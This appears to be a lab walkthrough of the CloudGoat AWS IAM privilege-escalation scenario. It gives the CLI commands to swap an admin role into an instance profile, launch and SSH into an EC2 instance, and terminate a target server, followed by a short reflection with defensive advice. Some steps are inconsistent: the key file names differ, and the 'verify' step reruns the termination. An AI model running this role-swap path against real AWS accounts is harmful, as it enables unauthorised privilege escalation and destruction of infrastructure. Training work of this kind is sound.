## Steps

## Step 1
- Configure AWS CLI using the command.
    aws configure --profile kerrigan

- Run the command to check IAM user information.
    aws sts get-caller-identity --profile kerrigan  

## Step 2
- Look for permission assigned and roles configured on this profile kerrigan using this command.
    aws --profile kerrigan iam list-roles --output text
        or
    aws iam list-roles --profile kerrigan

- Then retrieve the ec2 instance information using the command. 
    aws ec2 describe-instances --profile kerrigan
        or
    aws ec2 describe-instances --profile kerrigan --query "Reservations[*].Instances[*].[InstanceId, InstanceType, State.Name, PublicIpAddress]" --output table

## Step 3
- Once you identify IAM role with the full-admin policy attached and ec2 instance information, remove the role from the instance using this command.
    aws iam remove-role-from-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz --role-name cg-ec2-meek-role-iam_privesc_by_attachment-abc123xyz --profile kerrigan

- And add the mighty role
    aws iam add-role-to-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz --role-name cg-ec2-mighty-role-iam_privesc_by_attachment-abc123xyz --profile kerrigan

## Step 4
- Create a new ec2 key pair. To create key pair use this command.
    aws ec2 create-key-pair --key-name pwned2 --profile kerrigan --query 'KeyMaterial' --output text > pwned.pem

- Give read, write and execute for the key pair.
    chmod 600 pwned2.pem

## Step 5
- Now, we have shell access let's get the subnet ID, security group, instance profile ARN, and image ID to create an instance.
    aws ec2 describe-subnets --profile kerrigan
        and
    aws ec2 describe-security-groups --profile kerrigan
        and
    aws ec2 describe-instances --profile kerrigan --query "Reservations[*].Instances[*].{ID:InstanceId, Type:InstanceType, State:State.Name, IP:PublicIpAddress}" --output table
        or
    aws ec2 describe-instances --profile kerrigan
        
        or a combination of all
    
    aws ec2 describe-instances  --profile kerrigan  --query "Reservations[*].Instances[*].{InstanceID:InstanceId, ImageID:ImageId, SubnetID:SubnetId, SecurityGroupID:SecurityGroups[0].GroupId, ProfileARN:IamInstanceProfile.Arn}"  --output table

## Step 6
- Create and power the ec2 instance
    aws ec2 run-instances --image-id ami-0d7405d05f836d0d4 --instance-type t3.micro --iam-instance-profile Arn=arn:aws:iam::237024525721:instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz --key-name pwned2 --profile kerrigan --subnet-id subnet-09dbaee9e6ab7ab0b --security-group-ids sg-0e1662214735f3d7f

## Step 7
- Get the public ipv4 or public dns to access new ec2 via SSH.
- First, get the public dns.
    aws --profile kerrigan ec2 describe-instances --region us-east-1

- Then access ec2 via ssh
    ssh -i pwned2.pem ubuntu@ec2-44-202-211-21.compute-1.amazonaws.com

## Step 8
- Run the command sudo apt-get update to verify admin privileges.
- Run sudo apt install awscli to find instance id
- Find the instance to be terminated. The goal is the terminate cg-super-critical-security-server-iam_privesc_by_attachment-abc123xyz. Use this command.
    aws ec2 describe-instances --profile kerrigan --query "Reservations[*].Instances[*].[Tags[?Key=='Name'].Value | [0], InstanceId, InstanceType, State.Name, PublicIpAddress]" --output table
- To terminate, run this command
    aws ec2 terminate-instances --instance-ids i-02e2747e52632f453 --region us-east-1

- Verify if the instance is terminated.
    aws ec2 terminate-instances --instance-ids i-02e2747e52632f453 --region us-east-1



## Reflection:

### What was your approach?
My approach started by a user kerrigan with the limited permission, enumerate IAM roles and instance profiles, replace the the low-privilege role with the admin role in the shared instance profile, launch an new ec2 with that profile, get the admin credentials from instance metadata over SSH, then use those credentials to terminate the super-critical-security-server.

### What was the biggest challenge?
The biggest challenge I encountered was setting the correct permissions on the private key file. On Windows, OpenSSH rejected pwned.pem because the file was accessible to other users, which prevented me from connecting to the EC2 instance via SSH.

### How did you overcome the challenges?
At first, I tried to fix the key permissions using PowerShell and icacls, but I continued to receive permission errors. I then switched to a Linux-based environment (WSL), copied the key into the Linux filesystem, ran chmod 600 on it, and successfully connected via SSH.

### What led to the breakthrough?
The breakthrough came when I realized kerrigan could modify the instance profile itself—removing the low-privilege role and adding the admin mighty role—then launch a new EC2 instance that would inherit those elevated credentials through the instance metadata service. Once I understood that I did not need direct admin access as kerrigan, only the ability to swap roles in the profile and run instances, the full attack path became clear.

### On the blue side, how can the learning be used to properly defend the important assets?
To defend important assets:
1. Always apply least privilege
2. Separate roles from profiles
3. Protect the metadata by adding IMDSv2


## References:
https://jellyparks.com/posts/iam-privesc-by-attachment/
https://medium.com/@Cyber_Anom/cloudgoat-iam-privesc-by-attachment-walk-through-b00afa495919
https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/iam_privesc_by_attachment/README.md
https://gemini.google.com/app